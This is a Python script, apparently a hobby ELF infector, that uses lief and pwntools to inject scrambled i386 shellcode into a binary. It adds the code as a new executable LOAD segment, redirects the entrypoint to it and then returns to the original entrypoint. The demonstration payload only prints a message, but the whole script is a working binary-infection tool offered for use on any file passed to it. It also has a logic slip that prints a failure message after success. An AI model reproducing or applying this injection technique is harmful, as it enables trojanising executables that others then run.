import argparse
import sys
import lief
from pwn import *
from termcolor import colored, cprint


      
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))  
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))    
                                                                                              
def infect(file, output):
    x = True
    prGreen("[+] It has been infected")
    payload   = "dangerous is coming\n"
    evilfile  = lief.parse(file)
    devilcode = asm("mov esi, edx")
    devilcode += asm(pwnlib.shellcraft.i386.write(1, payload, len(payload)))
    devilcode =  pwnlib.encoders.encoder.scramble(devilcode)
    hex_ = hex(evilfile.header.entrypoint)
    devilcode += asm(f"mov esi, edx; push {hex_}; ret")
    print("devilcode size : " ,len(devilcode))   # print the devilcode size 
    # ------------------------------------------------------------------------------------------
    
    segment = lief.ELF.Segment() 
    segment.type =  lief.ELF.SEGMENT_TYPES.LOAD 
    segment.flags = lief.ELF.SEGMENT_FLAGS.X                        
    segment.content = bytearray(devilcode)                          
    segment.alignment = 0x1234                                     #segment alignment in memory.
    evilfile.add(segment)
    
                                                                                  
    prGreen("[+] Segment has been linked to the file")
    # -------------------------------------------------------------------------------------------
    
    
    
    print("The orginal entrypoint: "  ,hex(evilfile.header.entrypoint))            
    
    for x in evilfile.segments:
        if (x.type == lief.ELF.SEGMENT_TYPES.LOAD) and (x.alignment == 0x1234):
            evilfile.header.entrypoint = x.virtual_address                 # write our allignment memory to entrypoint
            break
        
    print("New entrypoint: " ,hex(evilfile.header.entrypoint))    
    
                                                                    
    evilfile.write(output)  
 
        
    
           

def main():
    pars = argparse.ArgumentParser()
    pars.add_argument("-f", help="file to be infected", required=True) 
    pars.add_argument("-o", help="the output file")                         
    
    args = pars.parse_args()
    if len(sys.argv) < 2:
        pars.print_help()
        exit(0) 
        
    if not (infect(args.f, args.o)):
        return
    else:
        prRed("[-] It has not been infected")
            
    
     
if __name__ == "__main__":
    main()
        
    
